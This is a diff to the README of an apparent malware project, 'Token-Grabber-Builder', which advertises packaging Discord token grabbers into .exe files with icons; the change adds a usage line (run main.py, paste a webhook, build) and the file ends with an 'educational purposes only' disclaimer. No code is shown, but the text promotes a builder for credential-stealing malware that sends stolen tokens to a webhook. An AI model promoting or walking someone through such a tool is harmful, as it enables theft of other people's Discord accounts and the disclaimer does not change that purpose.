@@ -1,7 +1,7 @@
 # Token-Grabber-Builder
 Make Discord token grabbers that are in .exe format. 
 - Converts your .py file to .exe format with an icon
-- No coding experience required
+- run main.py -> paste webhook -> build
 
 ## About
 This tool should only be used for educational purposes only. Do not use this on others maliciously. 
